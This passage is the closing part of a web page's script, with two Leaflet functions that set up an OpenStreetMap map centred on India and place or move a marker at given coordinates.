function initMap(){ if(leafletMap){leafletMap.invalidateSize();return;} leafletMap=L.map('mapContainer').setView([20.5937,78.9629],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(leafletMap); }
function updateMap(lat,lng){ if(!leafletMap)initMap(); const ll=L.latLng(lat,lng); if(leafletMarker)leafletMarker.setLatLng(ll); else leafletMarker=L.marker(ll).addTo(leafletMap); leafletMap.setView(ll,15); }
</script>
</body>
</html>
